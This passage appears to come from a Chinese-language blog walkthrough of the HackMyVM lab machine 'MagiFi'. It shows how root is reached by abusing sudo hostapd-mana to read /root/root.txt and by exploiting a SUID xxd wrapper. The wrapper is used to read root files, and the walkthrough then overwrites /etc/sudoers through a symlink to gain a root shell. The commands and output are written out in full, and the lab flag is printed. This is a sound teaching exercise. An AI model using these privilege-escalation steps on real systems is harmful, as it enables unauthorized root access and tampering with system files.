ctrl_iface\u003e] [-G \u0026#x3C;group\u003e]\\\n         [-i \u0026#x3C;comma-separated list of interface names\u003e]\\\n         \u0026#x3C;configuration file(s)\u003e\n\noptions:\n   -h   show this usage\n   -d   show more debug messages (-\u003cspan class=\"hljs-built_in\"\u003edd\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e even more)\n   -B   run daemon \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the background\n   -e   entropy file\n   -g   global control interface path\n   -G   group \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e control interfaces\n   -P   PID file\n   -K   include key data \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e debug messages\n   -i   list of interface names to use\n   -S   start all the interfaces synchronously\n   -t   include timestamps \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e some debug messages\n   -v   show hostapd version\nharry_potter@MagiFi:~/Hogwarts_web$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以注意到\u003ccode\u003e-d   show more debug messages (-dd for even more)\u003c/code\u003e 输出更多调试信息，然后最后是跟上\u003ccode\u003e\u0026#x3C;configuration file(s)\u003e\u003c/code\u003e 数据文件\u003c/p\u003e\n\u003cp\u003e然后我们在他后面跟上\u003ccode\u003e/root/root.txt\u003c/code\u003e即可读出\u003ccode\u003eflag\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eharry_potter@MagiFi:~/Hogwarts_web$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /usr/bin/hostapd-mana -\u003cspan class=\"hljs-built_in\"\u003edd\u003c/span\u003e /root/root.txt\n\u0026#x3C;_web$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /usr/bin/hostapd-mana -\u003cspan class=\"hljs-built_in\"\u003edd\u003c/span\u003e /root/root.txt\nrandom: Trying to \u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003e entropy from /dev/random\nConfiguration file: /root/root.txt\nLine 1: invalid line \u003cspan class=\"hljs-string\"\u003e'hogwarts{5ed0818c0181fe97f744d7b1b51dd9c7}'\u003c/span\u003e\n1 errors found \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e configuration file \u003cspan class=\"hljs-string\"\u003e'/root/root.txt'\u003c/span\u003e\nFailed to \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e up interface with /root/root.txt\nhostapd_init: free iface 0x55809fa7af40\nFailed to initialize interface\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e解法 2\u003c/h2\u003e\n\u003cp\u003e查找系统中所有具有 \u003ccode\u003eSUID（Set User ID）\u003c/code\u003e权限的可执行文件\u003c/p\u003e\n\u003cp\u003e找到一些奇奇怪怪的，\u003ccode\u003e/usr/bin/xxd_horcrux\u003c/code\u003e 和\u003ccode\u003e/home/tom.riddle/.horcrux.png\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eharry_potter@MagiFi:~$ find / -perm -u=s -\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e f 2\u003e/dev/null\n/usr/bin/gpasswd                                                              \n/usr/bin/chfn                 \n/usr/bin/umount               \n/usr/bin/newgrp                  \n/usr/bin/xxd_horcrux  \n/usr/lib/eject/dmcrypt-get-device\n...\n/home/tom.riddle/.horcrux.png\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看\u003ccode\u003e/usr/bin/xxd_horcrux\u003c/code\u003e 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eharry_potter@MagiFi:~$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al /usr/bin/xxd_horcrux\n-rwsr-xr-x 1 root root 17264 Sep 25 12:22 /usr/bin/xxd_horcrux\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试将\u003ccode\u003e/etc/shadow\u003c/code\u003e文件使用\u003ccode\u003exxd\u003c/code\u003e读出来，貌似读不出来，这是莫改过的\u003ccode\u003exxd\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eharry_potter@MagiFi:~$ /usr/bin/xxd_horcrux -i /etc/shadow -O pass\nNot every wizards can use or destroy a Horcrux!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eharry_potter@MagiFi:~$ find / -name *horcrux* 2\u003e/dev/null\n/usr/bin/xxd_horcrux\n/home/tom.riddle/.horcrux.png\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e又尝试\u003ccode\u003e/home/tom.riddle/.horcrux.png\u003c/code\u003e 但是提示\u003ccode\u003epermission denied\u003c/code\u003e ，摸不着头脑\u003c/p\u003e\n\u003cp\u003e根据\u003ccode\u003exxd_horcrux\u003c/code\u003e的提示，可能后面是要跟\u003ccode\u003e.horcrux.png\u003c/code\u003e ，不过还是提示了错误\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eharry_potter@MagiFi:~$ /usr/bin/xxd_horcrux -i /home/tom.riddle/.horcrux.png -O 1.txt\nNot every wizards can use or destroy a Horcrux!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们将\u003ccode\u003exxd_horcrux\u003c/code\u003e 拉取出来，使用\u003ccode\u003eIDA\u003c/code\u003e分析\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eint __fastcall main(int argc, const char **argv, const char **envp)\n{\n  char **argva; // [rsp+0h] [rbp-30h]\n  int v5; // [rsp+Ch] [rbp-24h]\n  int i; // [rsp+18h] [rbp-18h]\n  int fd; // [rsp+1Ch] [rbp-14h]\n  char *s1; // [rsp+20h] [rbp-10h]\n\n  v5 = argc;\n  argva = (char **)argv;\n  s1 = 0LL;\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( argc \u0026#x3C;= 1\n    || (argv = (const char **)\u003cspan class=\"hljs-string\"\u003e\"-h\"\u003c/span\u003e, *(_QWORD *)\u0026#x26;argc = argva[1], !strcmp(*(const char **)\u0026#x26;argc, \u003cspan class=\"hljs-string\"\u003e\"-h\"\u003c/span\u003e))\n    || (argv = (const char **)\u003cspan class=\"hljs-string\"\u003e\"--help\"\u003c/span\u003e, *(_QWORD *)\u0026#x26;argc = argva[1], !strcmp(*(const char **)\u0026#x26;argc, \u003cspan class=\"hljs-string\"\u003e\"--help\"\u003c/span\u003e)) )\n  {\n    show_help(*(_QWORD *)\u0026#x26;argc, argv, envp);\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e 1;\n  }\n  \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e\n  {\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e ( i = 1; i \u0026#x3C; v5; ++i )\n    {\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( !strcmp(argva[i], \u003cspan class=\"hljs-string\"\u003e\"-O\"\u003c/span\u003e) \u0026#x26;\u0026#x26; v5 \u003e i + 1 )\n      {\n        s1 = argva[i + 1];\n        argva[i] = 0LL;\n        argva[i + 1] = 0LL;\n        \u003cspan class=\"hljs-built_in\"\u003ebreak\u003c/span\u003e;\n      }\n    }\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( s1 )\n    {\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( !strcmp(s1, \u003cspan class=\"hljs-string\"\u003e\".horcrux.png\"\u003c/span\u003e) )\n      {\n        fd = open(s1, 577, 384LL);\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( fd \u003e= 0 )\n        {\n          \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( dup2(fd, 1) \u003e= 0 )\n          {\n            close(fd);\n            execvp(\u003cspan class=\"hljs-string\"\u003e\"/usr/bin/xxd\"\u003c/span\u003e, argva);\n            perror(\u003cspan class=\"hljs-string\"\u003e\"Error executing xxd\"\u003c/span\u003e);\n          }\n          \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e\n          {\n            perror(\u003cspan class=\"hljs-string\"\u003e\"Error redirecting output to file\"\u003c/span\u003e);\n            close(fd);\n          }\n          \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e 1;\n        }\n        \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e\n        {\n          perror(\u003cspan class=\"hljs-string\"\u003e\"Error opening output file\"\u003c/span\u003e);\n          \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e 1;\n        }\n      }\n      \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e\n      {\n        fwrite(\u003cspan class=\"hljs-string\"\u003e\"Not every wizards can use or destroy a Horcrux!\\n\"\u003c/span\u003e, 1uLL, 0x30uLL, stderr);\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e 1;\n      }\n    }\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以看到判断了是否存在\u003ccode\u003e-O\u003c/code\u003e参数，然后\u003ccode\u003e-O\u003c/code\u003e参数后面跟着的必须是\u003ccode\u003e.horcrux.png\u003c/code\u003e ，但是\u003ccode\u003e.horcrux.png\u003c/code\u003e 没有指定一定要是在\u003ccode\u003e/home/tom.riddle\u003c/code\u003e 家目录里面，所以我们可以在我们家目录创建\u003ccode\u003e.horcrux.png\u003c/code\u003e ，然后通过\u003ccode\u003exxd_horcurx\u003c/code\u003e读取文件内容输出到\u003ccode\u003e.horcrux.png\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eharry_potter@MagiFi:~$ \u003cspan class=\"hljs-built_in\"\u003etouch\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\" \"\u003c/span\u003e \u003e .horcrux.png\nharry_potter@MagiFi:~$ /usr/bin/xxd_horcrux /root/root.txt -O .horcrux.png \nharry_potter@MagiFi:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e .horcrux.png \n00000000: 686f 6777 6172 7473 7b35 6564 3038 3138  hogwarts{5ed0818\n00000010: 6330 3138 3166 6539 3766 3734 3464 3762  c0181fe97f744d7b\n00000020: 3162 3531 6464 3963 377d 0a              1b51dd9c7}.\nharry_potter@MagiFi:~$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功读到\u003ccode\u003eRootflag\u003c/code\u003e文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ehogwarts{5ed0818c0181fe97f744d7b1b51dd9c7}.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e顺便将\u003ccode\u003eRootShell\u003c/code\u003e也拿了，通过\u003ca href=\"https://gtfobins.github.io/gtfobins/xxd/#file-write\"\u003ehttps://gtfobins.github.io/gtfobins/xxd/#file-write\u003c/a\u003e 可以知道可以利用\u003ccode\u003exxd\u003c/code\u003e修改文件，我们将\u003ccode\u003e/etc/passwd\u003c/code\u003e或者\u003ccode\u003e/etc/sudoer\u003c/code\u003e修改即可\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eharry_potter@MagiFi:~$ /usr/bin/xxd_horcrux /etc/sudoers -O .horcrux.png \nharry_potter@MagiFi:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e .horcrux.png | xxd -r \u003e tmp\nharry_potter@MagiFi:~$ \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"harry_potter    ALL=(ALL:ALL) NOPASSWD: ALL\"\u003c/span\u003e \u003e\u003e tmp\nharry_potter@MagiFi:~$ \u003cspan class=\"hljs-built_in\"\u003erm\u003c/span\u003e .horcrux.png\nharry_potter@MagiFi:~$ \u003cspan class=\"hljs-built_in\"\u003eln\u003c/span\u003e -sv /etc/sudoers .horcrux.png\n\u003cspan class=\"hljs-string\"\u003e'.horcrux.png'\u003c/span\u003e -\u003e \u003cspan class=\"hljs-string\"\u003e'/etc/sudoers'\u003c/span\u003e\nharry_potter@MagiFi:~$ xxd tmp \u003e getroot\nharry_potter@MagiFi:~$ /usr/bin/xxd_horcrux -r getroot -O .horcrux.png \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再看一下我们的权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eharry_potter@MagiFi:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e harry_potter on MagiFi:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser harry_potter may run the following commands on MagiFi:\n    (root) NOPASSWD: /usr/sbin/aireplay-ng, /usr/sbin/airmon-ng, /usr/sbin/airodump-ng, /usr/bin/airdecap-ng, /usr/bin/hostapd-mana\n    (ALL : ALL) NOPASSWD: ALL\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eharry_potter@MagiFi:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e su -\nroot@MagiFi:~# \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=0(root) gid=0(root) \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e=0(root)\nroot@MagiFi:~# \n\u003c/code\u003e\u003c/pre\u003e","title":"HackMyVM - Magifi","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["HackMyVM","Linux靶机"],"categories":"靶机"}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackMyVMMagifi"},"buildId":"Ccn3Uy_j8m9kBQAk6sKIJ","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>